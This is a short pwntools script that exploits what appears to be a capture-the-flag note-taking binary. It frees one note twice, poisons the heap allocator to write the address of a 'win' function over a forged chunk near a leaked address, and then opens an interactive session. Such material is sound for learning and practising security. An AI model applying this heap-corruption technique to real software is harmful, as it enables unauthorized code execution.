from pwn import process, ELF, p64, gdb, PTY

target = ELF("./chal")

io = process(target.path, stdin=PTY, stdout=PTY)

def create_note(data: bytes):
    io.recvuntil(b'> ')
    io.sendline(b'2')
    io.recvuntil(b': ')
    io.sendline(data)

def delete_note(index: int):
    io.recvuntil(b'> ')
    io.sendline(b'4')
    io.sendline(str(index).encode('utf-8'))

def exit_program():
    io.recvuntil(b'> ')
    io.sendline(b'5')

io.recvuntil(b'0x')
choice_addr_hex = io.recvline()[:-1].decode('utf-8')
choice_addr = int(choice_addr_hex, 16)

forged_chunk = choice_addr + 25
written_data = p64(target.sym['win'])

create_note(b'whatever')
delete_note(0)
delete_note(0)
create_note(p64(forged_chunk))
create_note(b'')
create_note(written_data)
exit_program()

io.interactive()
